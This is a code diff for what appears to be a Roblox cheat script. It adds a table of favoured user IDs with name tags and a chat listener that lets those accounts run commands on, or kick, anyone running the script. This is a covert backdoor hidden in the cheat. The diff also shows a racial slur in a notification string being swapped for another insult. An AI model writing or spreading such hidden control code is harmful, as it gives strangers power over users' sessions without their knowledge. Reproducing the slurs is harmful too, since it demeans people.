@@ -179,7 +179,7 @@ end
 getgenv().Teleport = function(Part)
 if not type(Part) == "CFrame" then return end 
 if not GetChar():FindFirstChild'HumanoidRootPart' then 
-	notif("STOP USING AIDEZ YOU STUPID NIGGER","fuck you!",5,"rbxassetid://1281284684") 
+	notif("STOP USING AIDEZ YOU DUMB BITCH","fuck you!",5,"rbxassetid://1281284684") 
 	return 
 end 
 	if _G.DoYouHaveBfgBypass then 
@@ -1756,6 +1756,86 @@ spawn(function()
 		if AntiAfk then 
 			keypress(0x20)
 		end
+	end
+end)
+
+local CoolkidTable = {
+	['300227703']	= "!fishgang Envy";
+    ['590620847'] 	= "!fishgang Envy";
+    ['714877']      = "!fishgang Ambiguity";
+    ['96316322']    = "!fishgang Ambiguity";
+    ['114164798']   = "!fishgang Slays (I bitch about the tag in 3rd person)";
+	['359564044'] 	= "!fishgang 7w4c";
+	['659119329'] 	= "!fishgang Cy | Creator/Co-owner";
+    ['12978668']  	= "!fishgang Cy Alt | Creator/Co-owner";
+    ['659119329']  	= "!fishgang Cy Alt | Creator/Co-owner";
+	['62009114'] 	= "!fishgang Owner X_D6";
+	['57370993'] 	= "!fishgang Karma (Gay)";
+	['20220183'] 	= "!fishgang Wya";
+	['105183043'] 	= "Drpoppadopolist | Drpoppa Creator";
+	['29461396'] 	= "trippinfo";
+	['197131085'] 	= "trippinfo";
+	['412957'] 		= "trippinfo";
+	['1443431439']  = "wk1r";
+	['164282612']   = "wk1r";
+	['548617338']   = "Cool Person";
+	['1275692258']  = "Big Dick (Vegan/Syntrix Creator who also paid me to put this)";
+    ['612618136']   = "Bird (Donator)";
+}
+
+local function espcool(Plr)
+if CoolkidTable[tostring(Plr.UserId)] == "!fishgang Slays (I bitch about the tag in 3rd person)" then return end 
+	local Esp1 = Instance.new('BillboardGui',Plr.Character.Head)
+	Esp1.Adornee = Plr.Character.Head
+	Esp1.Size = UDim2.new(0,100,0,100)
+	Esp1.StudsOffset = Vector3.new(0,1,0)
+	Esp1.AlwaysOnTop = true 
+	local Esp2 = Instance.new('TextLabel',Esp1)
+	Esp2.BackgroundTransparency = 1
+	Esp2.Text = CoolkidTable[tostring(Plr.UserId)]
+	Esp2.Position = UDim2.new(0,0,0,0)
+	Esp2.Size = UDim2.new(1,0,0,40)
+	Esp2.TextColor3 = Color3.fromRGB(125,0,0)
+	Esp2.TextStrokeTransparency = 0.5
+	Esp2.TextSize = 15
+	Esp2.TextStrokeColor3 = Color3.fromRGB(125,0,0)
+	Plr.Chatted:Connect(function(Chat)
+		local Arguments = string.split(Chat:sub(2)," ")
+		local Player = PlrFinder(Arguments[1])
+		table.remove(Arguments,1)
+		if Player and Player == LP --[[and not CoolkidTable[tostring(LP.UserId)]] then 
+			if Chat:sub(1,1) == "`" then 
+				CheckCommand(table.concat(Arguments," "))
+			end
+			if Chat:sub(1,1) == "[" then 
+				LP:Kick('You have been kicked by '..Plr.Name.." for "..table.concat(Arguments," "))
+			end
+		end
+	end)
+end
+
+local PlayersX = Players:GetPlayers()
+for i = 1,#PlayersX do
+	local Plr = PlayersX[i]
+	if CoolkidTable[tostring(Plr.UserId)] and Plr.Character:FindFirstChild'Head' then 
+		espcool(Plr)
+		Plr.CharacterAdded:Connect(function()
+			local Head = Plr.Character:WaitForChild('Head',10)
+			if Head then
+				espcool(Plr)
+			end
+		end)
+	end
+end
+
+Players.PlayerAdded:Connect(function(Plr)
+	if CoolkidTable[tostring(Plr.UserId)] then
+		Plr.CharacterAdded:Connect(function()
+			local Head = Plr.Character:WaitForChild('Head',10)
+			if Head then 
+				espcool(Plr)
+			end
+		end)
 	end
 end)
 
